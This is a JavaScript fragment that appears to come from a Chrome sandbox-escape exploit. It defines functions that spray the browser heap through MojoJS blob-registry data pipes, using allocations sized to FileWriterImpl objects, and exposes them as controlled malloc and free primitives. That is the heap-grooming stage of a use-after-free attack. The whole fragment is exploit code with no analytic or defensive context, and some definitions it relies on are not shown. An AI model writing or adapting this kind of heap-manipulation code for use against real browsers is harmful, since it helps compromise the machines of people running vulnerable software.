function create_controlled_space_in_heap() {
    let heap = new Array(kAllocationCount);
    for (var i = 0; i < kAllocationCount; ++i) {
        heap[i] = new Allocation(kFileWriterImplSize);
    }
    controlled_heap_space = heap
}

function Allocation(size=280) {
    function ProgressClient() {
        function ProgressClientImpl() {
        }
        ProgressClientImpl.prototype = {
            onProgress: async (arg0) => {
            }
        };
        var progress_client_ptr = new mojo.AssociatedInterfacePtrInfo();
        var progress_client_req = mojo.makeRequest(progress_client_ptr);
        var progress_client_binding = new mojo.AssociatedBinding(blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);
        return progress_client_ptr;
    }
    this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
    this.serialized_blob = blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, ProgressClient());
    this.malloc = function(data) {
        this.pipe.producer.writeData(data);
    }
    this.free = function() {
        this.pipe.producer.close();
    }
    return this;
  }